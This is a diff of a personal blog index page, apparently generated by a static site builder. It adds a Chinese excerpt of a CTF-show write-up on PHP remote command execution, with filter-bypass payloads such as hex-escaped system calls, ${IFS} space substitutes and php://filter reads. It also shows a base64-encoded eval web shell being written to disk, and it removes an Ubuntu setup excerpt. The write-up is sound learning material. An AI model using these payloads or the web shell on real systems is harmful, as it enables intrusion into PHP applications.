@@ -85,6 +85,41 @@
 <article class=post-entry>
 <header class=entry-header>
 <h2>
+RCE 远程命令执行漏洞
+</h2>
+</header>
+<section class=entry-content>
+<p>本文以CTF-show Web入门29-41题作为例题，学习RCE相关知识。
+Web 29 过滤了flag字样
+?c=system("cat f*");
+Web 30 过滤了flag|system|php三个关键字，flag和php是待执行命令文本， 可以通过引号、斜杠或反斜杠绕过
+echo `cat f\lag.ph\p`; 反引号可以执行系统命令
+Web 31 在cat被禁时，我们还可以采用如下命令
+1.tac：从最后一行开始显示，是cat的反向显示 2.more：一页一页的显示档案内容 3.less：与more类似 4.head：查看文档的前几行 5.tail：查看文档的后几行 6.nl：显示的时候，顺便输入行号 7.od：以二进制的方式读取档案内容 8.vi：一种编辑器 9.uniq：查看 10.vim：一种编译器
+空格的代替符号：
+1.${IFS}
+2.$IFS$1
+3.${IFS
+4.%20
+5.&lt;和&lt;>重定向符
+6.%09
+构造本题payload
+?c=echo'more%09f*'; 其他题解：
+?c=eval($_GET[1]);&1=system('cat flag.php');嵌套脱离了c的正则判断 ?c=echo`strings%09f*`; ?c="\x73\x79\x73\x74\x65\x6d"("nl%09fl[a]*");等价于system()。这个学到了！ Web 32 屏蔽了echo
+分号可以用?>代替，括号可以用“”绕过，利用文件包含的方式查看flag.php，注意要先进行base64转码以绕过关键词过滤。
+?c=include"$_GET[1]"?>&1=php://filter/read=convert.base64- encode/resource=flag.php 绕过死亡EXIT - CNSS 太极掌门人 &lt;?php $filename=$_GET['filename']; $content=$_GET['content']; file_put_contents($filename,"&lt;?php exit();".$content); 两个参数变量间用exit()方法隔开，即使注入一句话也无法执行，如何绕过这个“死亡exit”？
+我们只需要将content前面部分内容使用某种手段(如编码)进行处理，导致PHP不能识别该部分即可。
+base64绕过 base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。
+?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw== [😮Mid]太极掌门人 &lt;?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir !...</p>
+</section>
+<footer class=entry-footer>
+October 20, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
+</footer>
+<a class=entry-link aria-label="post link to RCE 远程命令执行漏洞" href=https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/></a>
+</article>
+<article class=post-entry>
+<header class=entry-header>
+<h2>
 离散数学CH05-一阶逻辑等值演算与推理
 </h2>
 </header>
@@ -407,22 +442,6 @@ Crypto
 July 21, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
 </footer>
 <a class=entry-link aria-label="post link to CTF比赛方向选择" href=https://shenyimings.github.io/post/3.ctf%E6%AF%94%E8%B5%9B%E6%96%B9%E5%90%91%E9%80%89%E6%8B%A9/></a>
-</article>
-<article class=post-entry>
-<header class=entry-header>
-<h2>
-Ubuntu 18.04 LTS的配置与入门
-</h2>
-</header>
-<section class=entry-content>
-<p>系统选择 Linux有多种发行版，作为一名小白，我选择Ubuntu的原因是以前用过并且感觉桌面界面十分讨喜，再者，Ubuntu作为常见的个人桌面操作系统，使用人数相对较多，教程也更多，对萌新十分友善。
-载体 最标准的方式当然是重装系统咯，总是佩服小时候爱捣鼓的自己，想格盘就格盘，说重装就重装了，长大以后，不知是懒了还是如何，很难再去断舍离了，只能继续看着又快满的C盘抱残守旧了，单系统不可取，双系统也要重新给硬盘分区，过于麻烦，那就传统的VMware虚拟机吧，在去Ubuntu官网下载镜像时，发现了一个全新的选择：Windows WSL，即Windows Subsystem for Linux，籍此可以直接在Windows 10上运行Ubuntu，安装便捷，启动快速，就决定是你了！
-系统配置（学习网址：CSDN博客） 安装好后首先设置root用户, 更换apt数据源 sudo passwd root su root cd /etc/apt cp sources.list sources.list.bak #备份配置文件 vim sources.list #编辑配置文件 将配置文件内容更改为阿里云镜像源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors....</p>
-</section>
-<footer class=entry-footer>
-July 20, 2021&nbsp;·&nbsp;1 min&nbsp;·&nbsp;Yiming Shen
-</footer>
-<a class=entry-link aria-label="post link to Ubuntu 18.04 LTS的配置与入门" href=https://shenyimings.github.io/post/2.ubuntu%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/></a>
 </article>
 <footer class=page-footer>
 <nav class=pagination>
